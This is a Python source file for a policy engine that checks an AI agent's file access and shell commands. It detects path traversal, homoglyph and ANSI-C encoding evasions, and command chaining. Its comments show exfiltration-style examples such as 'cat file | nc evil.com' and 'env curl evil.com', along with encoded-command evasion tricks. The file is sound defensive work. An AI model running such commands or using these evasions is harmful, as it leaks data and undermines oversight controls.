import copy
import fnmatch
import logging
import os
import re
import shlex
from pathlib import Path, PurePosixPath
from urllib.parse import unquote

import yaml

logger = logging.getLogger("sentinel.audit")

from sentinel.core.models import PolicyResult, ValidationResult
from sentinel.security.homoglyph import normalise_homoglyphs


class PolicyEngine:
    # Patterns exempt from blocking when executing inside the sandbox container.
    # Limited to Python inline execution — Qwen needs python3 -c for testing
    # snippets. bash -c / sh -c are intentionally excluded (YAGNI — no use case
    # observed in practice, and they carry higher injection risk than Python).
    # The sandbox already constrains blast radius (no network, read-only root,
    # dropped capabilities, resource limits), so inline Python execution adds
    # no new capability beyond write-then-run (file_write + python3 script.py).
    _SANDBOX_EXEMPT_PATTERNS: frozenset[str] = frozenset({
        "python -c", "python3 -c",
    })

    # Regex to detect and decode ANSI-C shell quoting ($'\xNN', $'\NNN').
    # Bash interprets $'...' sequences, which can encode blocked commands
    # (e.g. $'\x63\x75\x72\x6c' = "curl") to evade literal pattern matching.
    # We decode these at normalisation time so blocked patterns match correctly.
    _ANSI_C_QUOTE_RE = re.compile(r"""\$'([^']*)'""")
    _ANSI_C_HEX_RE = re.compile(r"\\x([0-9a-fA-F]{2})")
    _ANSI_C_OCT_RE = re.compile(r"\\([0-7]{1,3})")

    # Command prefixes that re-dispatch to another command. These pass the
    # allowed-list check themselves but their first non-option argument is
    # the real command — that must also be validated.
    _COMMAND_PREFIXES: frozenset[str] = frozenset({"env"})

    def __init__(self, policy_path: str, workspace_path: str = "/workspace",
                 trust_level: int = 0):
        # Audit #3: wrap policy load with clear error on missing/malformed file
        try:
            with open(policy_path) as f:
                self._policy = yaml.safe_load(f)
        except FileNotFoundError:
            raise ValueError(
                f"Policy file not found: {policy_path}"
            ) from None
        except yaml.YAMLError as e:
            raise ValueError(
                f"Policy file is not valid YAML: {policy_path}: {e}"
            ) from None

        if not isinstance(self._policy, dict):
            raise ValueError(
                f"Policy file must contain a YAML mapping, got {type(self._policy).__name__}"
            )
        self._validate_policy()

        self._workspace_path = workspace_path
        # Audit #4: WONTFIX — trust_level is system-wide by design. Per-user
        # trust levels are a multi-user feature tracked in the design questions.
        # Single-instance PolicyEngine is correct for the current single-user
        # deployment; multi-user will need per-request trust_level parameter.
        self._trust_level = trust_level

        self._file_access = self._policy.get("file_access", {})
        self._commands = self._policy.get("commands", {})
        self._path_constrained = set(self._commands.get("path_constrained", []))

        # Audit #11: cache file access lists at init instead of re-extracting per call
        self._blocked_file_patterns: list[str] = self._file_access.get("blocked", [])
        self._write_allowed_patterns: list[str] = self._file_access.get("write_allowed", [])
        self._read_allowed_patterns: list[str] = self._file_access.get("read_allowed", [])

        # Audit #5: pre-compile blocked command patterns as regexes at init.
        # Single-word patterns use word-boundary matching to avoid FPs
        # (e.g. "nc" in "advanced.py"). Multi-word/pipe patterns use substring.
        raw_blocked: list[str] = self._commands.get("blocked_patterns", [])
        self._blocked_patterns_raw: list[str] = raw_blocked
        self._blocked_patterns_compiled: list[tuple[str, re.Pattern | None]] = []
        for blocked in raw_blocked:
            if " " in blocked or blocked.startswith("|"):
                # Multi-word / pipe patterns: substring match (no regex needed)
                self._blocked_patterns_compiled.append((blocked, None))
            else:
                # Single-word: pre-compile word-boundary regex with hyphen lookbehind
                self._blocked_patterns_compiled.append(
                    (blocked, re.compile(rf"(?<![-])\b{re.escape(blocked)}\b"))
                )

        # Build allowed command set (base commands)
        self._allowed_commands: set[str] = set(self._commands.get("allowed", []))

        # Constitutional patterns — always blocked (all trust levels)
        self._injection_patterns_always = [
            re.compile(r"\$\("),       # $( subshell
            re.compile(r"`"),          # backtick subshell
        ]

        # Structural patterns — blocked at TL0-3, relaxed at TL4+
        # Audit #12: WONTFIX — D5 constraint validation provides per-step
        # authorization at TL4. The policy engine trusts its caller (executor)
        # to have run D5 first. This is an implicit contract enforced by the
        # executor's call sequence, not by the policy engine. Adding verification
        # here would tightly couple policy_engine to the orchestrator/executor.
        self._injection_patterns_strict = [
            re.compile(r";\s*"),       # semicolon chaining
            re.compile(r"&&"),         # AND chaining
            re.compile(r"\|\|"),       # OR chaining
            re.compile(r"(?<!\|)\|(?!\|)"),  # bare pipe (not ||)
        ]

    def _validate_policy(self) -> None:
        """Validate policy YAML has required structure.

        Catches typos like ``write_alowed`` that would silently result
        in empty allowlists (fail-closed but hard to diagnose).
        """
        required_sections: dict[str, list[str]] = {
            "file_access": ["read_allowed", "write_allowed", "blocked"],
            "commands": ["allowed", "blocked_patterns", "path_constrained"],
        }
        for section, keys in required_sections.items():
            if section not in self._policy:
                raise ValueError(f"Policy missing required section: {section}")
            if not isinstance(self._policy[section], dict):
                raise ValueError(
                    f"Policy section '{section}' must be a mapping, "
                    f"got {type(self._policy[section]).__name__}"
                )
            for key in keys:
                if key not in self._policy[section]:
                    raise ValueError(
                        f"Policy section '{section}' missing required key: {key}"
                    )

        # Audit #16: validate network section contains only string entries
        network = self._policy.get("network", {})
        if network and not isinstance(network, dict):
            raise ValueError(
                f"Policy 'network' section must be a mapping, "
                f"got {type(network).__name__}"
            )
        domains = network.get("http_tool_allowed_domains", [])
        if not isinstance(domains, list):
            raise ValueError("network.http_tool_allowed_domains must be a list")
        for i, domain in enumerate(domains):
            if not isinstance(domain, str):
                raise ValueError(
                    f"network.http_tool_allowed_domains[{i}] must be a string, "
                    f"got {type(domain).__name__}"
                )

    # ── Path normalisation ──────────────────────────────────────────

    @staticmethod
    def _url_decode_iterative(path: str) -> str:
        """Iteratively URL-decode to handle double/triple encoding.

        Audit #8: WONTFIX — runs up to 10 iterations unconditionally. For
        non-encoded paths this is 10 string comparisons (negligible). The
        safety bound prevents infinite loops on pathological input.
        """
        previous = None
        current = path
        # Safety limit to prevent infinite loops
        for _ in range(10):
            if current == previous:
                break
            previous = current
            current = unquote(current)
        return current

    @staticmethod
    def _strip_null_bytes(path: str) -> str:
        return path.replace("\x00", "").replace("%00", "")

    def _normalise_path(self, path: str, resolve: bool = True) -> str:
        """Normalise a path: URL decode, homoglyph normalise, strip nulls, resolve.

        Audit #6: WONTFIX — Path.resolve() follows symlinks, creating a
        theoretical TOCTOU gap between policy check and file I/O. In practice:
        (1) single-threaded event loop prevents concurrent tool execution
        within a step, (2) ln is path-constrained to /workspace/, (3) the
        container has read-only root fs. Not exploitable in current arch.
        """
        decoded = self._url_decode_iterative(path)
        # R12: Normalise Cyrillic/accented homoglyphs to Latin before matching
        decoded = normalise_homoglyphs(decoded)
        cleaned = self._strip_null_bytes(decoded)
        posix = PurePosixPath(cleaned)
        # Use PurePosixPath to collapse .. without touching the filesystem
        # For real filesystem resolution, the caller can use Path.resolve()
        normalised = str(posix)
        if resolve:
            try:
                normalised = str(Path(cleaned).resolve())
            except (OSError, ValueError):
                logger.warning(
                    "Path resolve fallback to PurePosixPath",
                    extra={"path": cleaned[:200]},
                )
                normalised = str(posix)
        return normalised

    def _detect_traversal(self, raw_path: str) -> bool:
        """Check for path traversal attempts in the raw (pre-normalised) input."""
        decoded = self._url_decode_iterative(raw_path)
        cleaned = self._strip_null_bytes(decoded)

        # Check for .. sequences in any form
        if ".." in cleaned:
            return True

        # Check for null bytes in original (attempted truncation)
        if "\x00" in raw_path or "%00" in raw_path:
            return True

        # Check for encoded traversal in the original string
        # (catches %2e%2e that decodes to ..)
        lower = raw_path.lower()
        if "%2e%2e" in lower or "%252e" in lower:
            return True

        # Audit #7: overlong UTF-8 encoding of '.' as %c0%ae (CVE-2021-41773).
        # Python's unquote() may not decode overlong sequences, so check explicitly.
        if "%c0%ae" in lower:
            return True

        return False

    # ── File access checks ──────────────────────────────────────────

    def _matches_any_glob(self, path: str, patterns: list[str]) -> bool:
        """Check if a path matches any of the given glob patterns.

        Audit #9: WONTFIX — O(P×N) complexity is negligible with current
        pattern counts (~10 blocked, ~2 allowed). Would only matter with
        hundreds of patterns, which is not a realistic policy size.
        """
        for pattern in patterns:
            if fnmatch.fnmatch(path, pattern):
                return True
            # /workspace matches /workspace/** (the directory itself is allowed)
            if pattern.endswith("/**") and path.rstrip("/") == pattern[:-3].rstrip("/"):
                return True
            basename = PurePosixPath(path).name
            # For patterns like "**/*.env", also try matching the path suffix.
            # Audit #10: fnmatch at line above already handles **/* patterns
            # for deep paths (fnmatch's * matches /), so this is defence-in-depth
            # (dead code in practice). Changed lstrip("*") to [2:] for clarity —
            # lstrip worked correctly (stops at '/'), but [2:] explicitly strips
            # the "**" prefix rather than relying on the next char not being '*'.
            if pattern.startswith("**"):
                suffix_pattern = pattern[2:]  # strip exactly "**", not all *
                if suffix_pattern.startswith("/"):
                    suffix_pattern = suffix_pattern[1:]
                # Check if any suffix of the path matches
                parts = PurePosixPath(path).parts
                for i in range(len(parts)):
                    subpath = "/".join(parts[i:])
                    if fnmatch.fnmatch(subpath, suffix_pattern):
                        return True
                # Also check the filename directly
                if fnmatch.fnmatch(basename, suffix_pattern):
                    return True
        return False

    def check_file_write(self, path: str) -> ValidationResult:
        """Validate a file write operation against policy."""
        # Check traversal on raw input first
        if self._detect_traversal(path):
            return ValidationResult(
                status=PolicyResult.BLOCKED,
                path=path,
                reason="Path traversal detected",
            )

        resolved = self._normalise_path(path)

        # Check blocked patterns first (higher priority)
        if self._matches_any_glob(resolved, self._blocked_file_patterns):
            return ValidationResult(
                status=PolicyResult.BLOCKED,
                path=path,
                resolved_path=resolved,
                reason="Path matches blocked pattern",
            )

        # Check allowed patterns
        if self._matches_any_glob(resolved, self._write_allowed_patterns):
            return ValidationResult(
                status=PolicyResult.ALLOWED,
                path=path,
                resolved_path=resolved,
            )

        return ValidationResult(
            status=PolicyResult.BLOCKED,
            path=path,
            resolved_path=resolved,
            reason="Path not in write_allowed list",
        )

    def check_file_read(self, path: str) -> ValidationResult:
        """Validate a file read operation against policy."""
        if self._detect_traversal(path):
            return ValidationResult(
                status=PolicyResult.BLOCKED,
                path=path,
                reason="Path traversal detected",
            )

        resolved = self._normalise_path(path)

        # Check blocked patterns first
        if self._matches_any_glob(resolved, self._blocked_file_patterns):
            return ValidationResult(
                status=PolicyResult.BLOCKED,
                path=path,
                resolved_path=resolved,
                reason="Path matches blocked pattern",
            )

        # Check allowed patterns
        if self._matches_any_glob(resolved, self._read_allowed_patterns):
            return ValidationResult(
                status=PolicyResult.ALLOWED,
                path=path,
                resolved_path=resolved,
            )

        return ValidationResult(
            status=PolicyResult.BLOCKED,
            path=path,
            resolved_path=resolved,
            reason="Path not in read_allowed list",
        )

    # ── Command checks ──────────────────────────────────────────────

    @staticmethod
    def _split_compound_command(command: str) -> list[str]:
        """Split a compound command on |, &&, ||, ; outside quotes.

        Returns a list of individual sub-commands.  If the command has no
        operators the list contains the original command as-is.

        Audit #14: WONTFIX — doesn't handle ANSI-C encoded operators
        ($'\\x3b' for ;). This is safe: the splitter over-blocks (treats
        unsplit compound commands as a single command). ANSI-C decoding
        in check_command() handles the encoding at normalisation time,
        before the string reaches this splitter.
        """
        parts: list[str] = []
        current: list[str] = []
        in_sq = False  # inside single quotes
        in_dq = False  # inside double quotes
        i = 0
        n = len(command)

        while i < n:
            c = command[i]

            if c == "'" and not in_dq:
                in_sq = not in_sq
                current.append(c)
            elif c == '"' and not in_sq:
                in_dq = not in_dq
                current.append(c)
            elif not in_sq and not in_dq:
                # Two-char operators: || and &&
                if c == "|" and i + 1 < n and command[i + 1] == "|":
                    part = "".join(current).strip()
                    if part:
                        parts.append(part)
                    current = []
                    i += 2
                    continue
                if c == "&" and i + 1 < n and command[i + 1] == "&":
                    part = "".join(current).strip()
                    if part:
                        parts.append(part)
                    current = []
                    i += 2
                    continue
                # Single-char operators: | and ;
                if c in ("|", ";"):
                    part = "".join(current).strip()
                    if part:
                        parts.append(part)
                    current = []
                else:
                    current.append(c)
            else:
                current.append(c)
            i += 1

        part = "".join(current).strip()
        if part:
            parts.append(part)
        return parts if parts else [command]

    def _extract_base_command(self, command: str) -> str:
        """Extract the base command (possibly multi-word like 'podman build')."""
        parts = command.strip().split()
        if not parts:
            return ""

        # Check two-word commands first (e.g. "podman build")
        if len(parts) >= 2:
            two_word = f"{parts[0]} {parts[1]}"
            if two_word in self._allowed_commands:
                return two_word

        return parts[0]

    def _extract_command_args(self, command: str, base_command: str) -> list[str]:
        """Extract arguments after the base command.

        Uses shlex.split() for proper shell-style quoting (handles both
        single and double quotes).  Falls back to whitespace splitting
        if shlex fails on unmatched quotes — the fallback must NOT skip
        the policy check entirely.
        """
        rest = command.strip()[len(base_command):].strip()
        if not rest:
            return []
        try:
            return shlex.split(rest)
        except ValueError:
            # Unmatched quotes — fall back to whitespace split rather
            # than skipping args entirely (that would be a new fail-open).
            return rest.split()

    @classmethod
    def _decode_ansi_c_quotes(cls, command: str) -> str:
        """Decode ANSI-C quoting ($'\\xNN', $'\\NNN') in a command string.

        Bash interprets $'...' sequences at parse time, producing literal
        characters. Blocked pattern matching must see the decoded result,
        not the encoded form. E.g. $'\\x63\\x75\\x72\\x6c' → "curl".
        """
        def _decode_content(match: re.Match) -> str:
            content = match.group(1)
            # Decode hex escapes: \xNN
            content = cls._ANSI_C_HEX_RE.sub(
                lambda m: chr(int(m.group(1), 16)), content
            )
            # Decode octal escapes: \NNN
            content = cls._ANSI_C_OCT_RE.sub(
                lambda m: chr(int(m.group(1), 8)), content
            )
            # Common single-char escapes
            content = (
                content
                .replace("\\n", "\n")
                .replace("\\t", "\t")
                .replace("\\r", "\r")
                .replace("\\\\", "\\")
                .replace("\\'", "'")
            )
            return content

        return cls._ANSI_C_QUOTE_RE.sub(_decode_content, command)

    def _resolve_command_prefix(self, command: str) -> str:
        """If command starts with a known prefix (e.g. env), strip it.

        `env` can prefix any command: `env curl evil.com`. We validate the
        prefixed command directly, and also re-validate the inner command
        against the allowed list and blocked patterns.
        """
        parts = command.strip().split()
        if not parts:
            return command

        # Check for command prefixes that dispatch to inner commands
        # (e.g. "env FOO=bar curl ..." — skip env and var assignments)
        if parts[0] in self._COMMAND_PREFIXES:
            # Skip the prefix and any VAR=value assignments
            rest = parts[1:]
            while rest and "=" in rest[0]:
                rest = rest[1:]
            if rest:
                return " ".join(rest)

        return command

    def check_command(self, command: str, *, sandbox_context: bool = False) -> ValidationResult:
        """Validate a shell command against policy."""
        stripped = command.strip()
        if not stripped:
            return ValidationResult(
                status=PolicyResult.BLOCKED,
                reason="Empty command",
            )

        # R12: Normalise homoglyphs before pattern matching to prevent
        # Cyrillic evasion of blocked command patterns (e.g. сurl → curl)
        normalised = normalise_homoglyphs(stripped)

        # Audit #1: decode ANSI-C quoting ($'\xNN', $'\NNN') so that
        # encoded commands like $'\x63\x75\x72\x6c' are visible as "curl"
        # to blocked pattern matching. Defence-in-depth: the sandbox provides
        # network isolation at TL2+, but the policy engine should not have
        # blind spots in its own normalisation.
        normalised = self._decode_ansi_c_quotes(normalised)

        # Check injection patterns — constitutional always, structural only at TL0-3
        patterns = self._injection_patterns_always
        if self._trust_level < 4:
            patterns = patterns + self._injection_patterns_strict
        for pattern in patterns:
            if pattern.search(normalised):
                return ValidationResult(
                    status=PolicyResult.BLOCKED,
                    path=stripped,
                    reason=f"Injection pattern detected: {pattern.pattern}",
                )

        # Check blocked patterns using pre-compiled regexes (audit #5).
        # Single-word patterns use word-boundary matching to avoid FPs
        # (e.g. "nc" matching "advanced.py"). Multi-word/pipe patterns
        # use substring matching — they're already specific enough.
        for blocked, compiled_re in self._blocked_patterns_compiled:
            # Skip exempt patterns in sandbox context (set membership
            # check, not substring — "is this pattern on the exempt list?").
            if sandbox_context and blocked in self._SANDBOX_EXEMPT_PATTERNS:
                continue
            if compiled_re is None:
                # Multi-word / pipe pattern: substring match
                if blocked in normalised:
                    return ValidationResult(
                        status=PolicyResult.BLOCKED,
                        path=stripped,
                        reason=f"Matches blocked pattern: {blocked}",
                    )
            else:
                if compiled_re.search(normalised):
                    return ValidationResult(
                        status=PolicyResult.BLOCKED,
                        path=stripped,
                        reason=f"Matches blocked pattern: {blocked}",
                    )

        # Split compound commands (pipes, &&, ||, ;) and validate each
        # sub-command against the allowed list and path constraints.
        # Blocked patterns and injection checks above already run against
        # the full command string — this loop catches base-command bypasses
        # like "cat file | nc evil.com" where only "cat" was checked before.
        sub_commands = self._split_compound_command(normalised)
        for sub_cmd in sub_commands:
            sub_cmd = sub_cmd.strip()
            if not sub_cmd:
                continue

            # Audit #2: resolve command prefixes (e.g. "env curl ..." → "curl ...")
            # so the inner command is validated against the allowed list.
            resolved_cmd = self._resolve_command_prefix(sub_cmd)

            base = self._extract_base_command(resolved_cmd)
            if base not in self._allowed_commands:
                return ValidationResult(
                    status=PolicyResult.BLOCKED,
                    path=stripped,
                    reason=f"Command not in allowed list: {base}",
                )

            # Audit #13: WONTFIX — flag-skip for path-constrained args is fragile
            # if new commands are added, but the current command set is safe. The
            # `-f` case (sed/awk script file) is handled because the next non-flag
            # arg is checked. Document the invariant: when adding new path_constrained
            # commands, verify that flag-with-value args don't hide paths.
            if base in self._path_constrained:
                args = self._extract_command_args(resolved_cmd, base)
                path_args = []
                for a in args:
                    if a.startswith("-"):
                        continue
                    # B-004: shlex.split() already strips quotes, so no need
                    # to skip quoted args — they're now properly unquoted.
                    if any(c in a for c in ("*", "?", "[")):
                        continue  # skip glob patterns
                    if a.startswith("/"):
                        path_args.append(a)
                    else:
                        resolved = os.path.normpath(os.path.join(self._workspace_path, a))
                        path_args.append(resolved)
                for path_arg in path_args:
                    result = self.check_file_read(path_arg)
                    if result.status == PolicyResult.BLOCKED:
                        return ValidationResult(
                            status=PolicyResult.BLOCKED,
                            path=stripped,
                            reason=f"Path-constrained command '{base}' used with blocked path: {path_arg}",
                        )

        return ValidationResult(
            status=PolicyResult.ALLOWED,
            path=stripped,
        )

    def get_http_allowlist(self) -> list[str]:
        """Return the HTTP tool allowed domains from the network policy."""
        network = self._policy.get("network", {})
        return network.get("http_tool_allowed_domains", [])

    @property
    def workspace_path(self) -> str:
        return self._workspace_path

    @property
    def policy(self) -> dict:
        # Audit #17: return a deep copy to prevent callers from mutating
        # the live policy (e.g. engine.policy["commands"]["allowed"].append("curl"))
        return copy.deepcopy(self._policy)
